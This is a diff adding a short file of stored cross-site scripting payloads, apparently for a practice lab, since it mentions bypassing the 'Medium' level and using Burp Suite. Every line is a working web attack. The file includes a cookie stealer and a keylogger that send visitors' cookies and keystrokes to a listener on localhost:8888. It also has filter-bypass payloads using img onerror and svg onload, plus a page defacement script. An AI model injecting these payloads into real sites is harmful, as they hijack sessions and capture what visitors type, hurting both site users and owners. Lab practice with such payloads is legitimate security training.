@@ -1,0 +1,22 @@
+# XSS Stored - Payloads (payloads.txt)
+
+# --- Basic alert ---
+<script>alert('Stored XSS')</script>
+<script>alert(document.cookie)</script>
+
+# --- Cookie stealer (every visitor's cookie is sent to attacker) ---
+<script>new Image().src='http://localhost:8888/?c='+document.cookie</script>
+
+# --- No <script> tag (bypass Medium) ---
+<img src=x onerror=alert(document.cookie)>
+<svg onload=alert(1)>
+
+# --- Defacement ---
+<script>document.body.innerHTML='<h1>HACKED</h1>'</script>
+
+# --- Keylogger ---
+<script>document.onkeypress=function(e){new Image().src='http://localhost:8888/?k='+e.key}</script>
+
+# --- Bypass maxlength (use Burp Suite to send these) ---
+<img src=x onerror=alert(document.cookie)>
+<svg/onload=alert`1`>
